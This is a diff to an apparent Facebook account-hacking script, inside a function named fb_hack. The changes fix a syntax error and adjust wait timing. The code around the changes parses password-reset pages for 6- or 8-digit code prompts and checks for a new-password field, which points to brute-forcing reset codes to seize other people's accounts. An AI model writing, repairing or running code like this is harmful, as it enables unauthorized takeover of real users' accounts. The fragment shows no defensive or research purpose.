@@ -157,7 +157,7 @@ def fb_hack(email, codex):
       soup = BeautifulSoup(response1, 'html.parser')
       check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
       if check1 == check3:
-        print(s.join(fail)
+        print(s.join(fail))
         count = 30
         sleepy(count)
       else:
@@ -186,7 +186,8 @@ def fb_hack(email, codex):
       check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
       if check2 != test:
         print(s.join(fail))
-        sleep(30)
+        count = 30
+        sleepy(count)
       else:
         soup = BeautifulSoup(response1, 'html.parser')
         if soup.find(string="password_new") == test:
